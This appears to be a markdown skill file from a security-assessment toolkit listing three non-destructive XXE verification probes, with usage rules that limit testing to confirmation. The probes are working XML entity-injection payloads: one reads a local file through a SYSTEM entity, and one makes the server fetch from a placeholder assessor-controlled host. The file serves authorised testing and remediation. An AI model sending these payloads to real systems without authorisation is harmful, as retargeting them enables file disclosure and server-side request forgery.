# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`xxe`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `xxe`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Entity-processing confirmation (benign internal)

**Expected differential:** a benign internal entity expands to its value in the response, proving the parser resolves entities before any external probe

```text
<!DOCTYPE xxe [<!ENTITY probe "xxe-core-marker-1a2b">]><root>&probe;</root>
```

### In-band dereference marker

**Expected differential:** a SYSTEM entity pointed at a benign local marker returns the marker in-band, proving file-read dereference without touching secrets

```text
<!DOCTYPE xxe [<!ENTITY m SYSTEM "file:///tmp/xxe-core-marker.txt">]><root>&m;</root>
```

### Internal-service reach (XXE-to-SSRF)

**Expected differential:** an http SYSTEM entity to a benign assessor host produces a callback from the server's egress address, proving server-issued fetch

```text
<!DOCTYPE xxe [<!ENTITY s SYSTEM "http://<assessor-controlled-host>/xxe-core-ping">]><root>&s;</root>
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
